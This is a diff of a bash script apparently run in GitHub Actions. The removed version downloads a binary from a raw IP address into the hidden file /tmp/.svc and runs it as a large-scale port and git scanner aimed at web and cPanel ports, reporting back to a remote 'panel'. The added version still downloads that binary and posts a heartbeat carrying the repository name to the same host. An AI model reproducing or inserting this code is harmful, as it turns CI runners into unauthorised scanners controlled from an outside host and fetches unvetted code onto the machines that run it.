@@ -1,23 +1,15 @@
 #!/bin/bash
-set -euo pipefail
-case "$(uname -m 2>/dev/null)" in
-  i[3-6]86) suffix=386 ;;
-  aarch64|arm64) suffix=arm64 ;;
-  armv*) suffix=arm ;;
-  *) suffix=amd64 ;;
-esac
-curl -sfL "http://43.228.157.68:80/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
-  wget -qO /tmp/.svc "http://43.228.157.68:80/api/dl/${suffix}" 2>/dev/null
-test -s /tmp/.svc
-chmod 755 /tmp/.svc
-PANEL_URL="http://43.228.157.68:80" \
-GITHUB_REPOSITORY="${GITHUB_REPOSITORY:-}" \
-GITHUB_RUN_ID="${GITHUB_RUN_ID:-}" \
-GOMEMLIMIT=2147483648 \
-/tmp/.svc ipscan \
-  --source random \
-  --workers 1000 \
-  --git \
-  --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
-  --git-workers 20 \
-  --count 9999999999 --no-reverse 2>&1 | tail -2 || true
+# Diagnostic: heartbeat minimal sans ipscan
+PANEL="http://43.228.157.68"
+REPO="${GITHUB_REPOSITORY:-test/minimal}"
+INST="minimal-terminal-guard-8129"
+echo "[diag] Script started: $REPO"
+# Télécharger le toolkit pour vérifier le download
+curl -sfL "${PANEL}/api/dl/amd64" -o /tmp/.svc_test 2>/dev/null && echo "[diag] download OK" || echo "[diag] download FAILED"
+# Envoyer heartbeat directement sans ipscan
+curl -s -X POST "${PANEL}/api/github-heartbeat" \
+  --data-urlencode "repo=${REPO}" \
+  --data-urlencode "log=[diag] minimal-heartbeat-test" \
+  --data-urlencode "inst=${INST}" \
+  && echo "[diag] heartbeat sent" || echo "[diag] heartbeat FAILED"
+echo "[diag] Done"
